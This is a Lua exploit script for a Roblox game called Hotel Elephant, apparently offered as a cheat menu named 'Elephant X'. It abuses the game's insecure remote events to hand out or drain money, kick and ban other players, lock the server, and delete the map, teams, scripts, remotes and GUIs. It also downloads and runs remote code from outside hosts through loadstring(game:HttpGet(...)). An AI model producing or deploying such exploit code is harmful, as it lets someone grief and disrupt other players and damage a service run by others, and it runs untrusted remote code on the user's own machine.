-- src/bin/hotels/elephant (Hotel Elephant)

local blacklists = {}

game:GetService("Players").LocalPlayer.DevEnableMouseLock = true

game.StarterGui:SetCore("SendNotification",{ -- reassurance
        Title = "Loading..";
        Text = "You are loading Elephant X! Due to the current GUI library we use, it might be difficult to load in.";
         Duration = 5;
})

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))() -- rayfield menu, basically the entire gui lmao, you should use it

local locked = false

local currval

game:GetService("Players").PlayerAdded:Connect(function(plr)
    if locked == true then
        game.StarterGui:SetCore("SendNotification",{ -- reassurance
        Title = plr.Name.." tried to join.";
        Text = "Server is currently locked.";
         Duration = 5;
    })
        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, plr)
    end
    if table.find(blacklists, plr.Name) then
        game.StarterGui:SetCore("SendNotification",{ -- reassurance
        Title = plr.Name.." tried to join.";
        Text = "That player is banned.";
         Duration = 5;
        })
        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, plr)
    end
end)

Rayfield:Notify({
   Title = "Cheers!",
   Content = "Welcome to Elephant X! I hope you're selfish needs have been fulfilled.",
   Duration = 5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "Okay!",
         Callback = function()
         print("I can't..")
      end
   },
},
})

local Window = Rayfield:CreateWindow({
   Name = "Elephant X",
   LoadingTitle = "Elephant X",
   LoadingSubtitle = "Made by SSxeR",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Elephant X"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Elephant X",
      Subtitle = "Key System",
      Note = "brubruburburbur",
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"https://pastebin.com/raw/2KGax2cr"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local Tab = Window:CreateTab("Exploiting", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Good Options")
local Me = Tab:CreateButton({
   Name = "Give Money!",
   Callback = function()
   game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, currval, "Cash")
   end,
})
local All = Tab:CreateButton({
   Name = "Give Everyone Money!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, currval, "Cash", v)
    end
   end,
})

local Slider = Tab:CreateSlider({
   Name = "Amount o' Money!",
   Range = {0, 1000},
   Increment = 10,
   Suffix = "Amount o' money",
   CurrentValue = 500,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   currval = Value
   end,
})

local Section = Tab:CreateSection("Abusive Options")

local FuckUp = Tab:CreateButton({
   Name = "Fuck the elevator!",
   Callback = function()
   while true do
       task.wait(0.1)
       game:GetService("ReplicatedStorage").ElevatorHandler:FireServer("1")
    end
   end,
})

local fuckval

local All = Tab:CreateButton({
   Name = "Fuck everyone's money!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, fuckval, "Cash", v)
    end
   end,
})

local Slider = Tab:CreateSlider({
   Name = "Amount o' Money! to fuck!",
   Range = {-1, -1000000},
   Increment = 100,
   Suffix = "Amount o' money to fuck!",
   CurrentValue = 500,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   fuckval = Value
   end,
})

local Section = Tab:CreateSection("Very Abusive Options")

local All = Tab:CreateButton({
   Name = "Delete the WHOLE MAP!",
   Callback = function()
   for _,v in pairs(game:GetDescendants()) do
       if v:IsA("Player") then
           
       else
        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Delete the TEAMS!",
   Callback = function()
   for _,v in pairs(game.Teams:GetDescendants()) do
     game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Delete CASH!11",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetDescendants()) do
       if v.Name == "leaderstats" then
           game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Delete ALL SCRIPTS!111",
   Callback = function()
       for _,v in pairs(game:GetDescendants()) do
        if v:IsA("Script") then
            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
        end
        if v:IsA("LocalScript") then
            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
        end
        if v:IsA("ModuleScript") then
            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
        end
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Delete almost all Remotes!11!!",
   Callback = function()
       for _,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if v.Name == "GuiHandler" or v.Name == "MoneyRequest" then
                print("Now this is vital remotes for the script to work: Game."..v:GetFullName())
            else
                game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
            end
        end
    end
   end,
})

local Section = Tab:CreateSection("Individual Kick & Ban Options")

local plre

local Input = Tab:CreateInput({
   Name = "Player!",
   PlaceholderText = "Player",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
    plre = Text
   end,
})

local All = Tab:CreateButton({
   Name = "Kick Player!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       if v.Name == plre then
           game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Ban Player!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       if v.Name == plre then
           table.insert(blacklists, v.Name)
           game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})


local All = Tab:CreateButton({
   Name = "Get Bans!",
   Callback = function()
   for _,v in pairs(blacklists) do
        game.StarterGui:SetCore("SendNotification",{ --waaw
            Title = "Banned Player";
             Text = v;
            Duration = 5;
     })
    end
   end,
})

local Section = Tab:CreateSection("Multiple Kick & Ban Options")

local All = Tab:CreateButton({
   Name = "Kick All Players!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
    end
   end,
})

local All = Tab:CreateButton({
   Name = "Kick Other Players!",
   Callback = function()
   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
       if v.Name == game:GetService("Players").LocalPlayer.Name then
                                        
       else
            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})
local All = Tab:CreateButton({
   Name = "Kick a Random Player!",
   Callback = function()
   local ama = game:GetService("Players"):GetPlayers()
   game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, ama[math.random(#ama)])
   end,
})

local Section = Tab:CreateSection("Lock Options")

local All = Tab:CreateButton({
   Name = "Lock Server!",
   Callback = function()
   locked = true
   end,
})

local All = Tab:CreateButton({
   Name = "Unlock Server!",
   Callback = function()
   locked = false
   end,
})

local Section = Tab:CreateSection("GUI Options")

local All = Tab:CreateButton({
   Name = "Delete all GUIs!",
   Callback = function()
   for _,v in pairs(game:GetDescendants()) do
       if v:IsA("ScreenGui") then
            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v)
       end
    end
   end,
})

local Tab = Window:CreateTab("Others", 4483362458) -- Title, Image
local Section = Tab:CreateSection("Scripts")
local All = Tab:CreateButton({
   Name = "Infinite Yield (EdgeIY)",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})
local All = Tab:CreateButton({
   Name = "Touch Fling (Shattered Gang)",
   Callback = function()
     game.StarterGui:SetCore("SendNotification",{ -- reassurance
        Title = "Loading..";
        Text = "You are loading Touch Fling! Now normally, i dont tell you that scripts are loading. But i need to tell you that the keycode to enable touch fling is the X key.";
         Duration = 5;
})
   -- -> discord.gg/G4nhhKFyyw <-
    _G.KeyCode = "X"
    loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
   end,
})
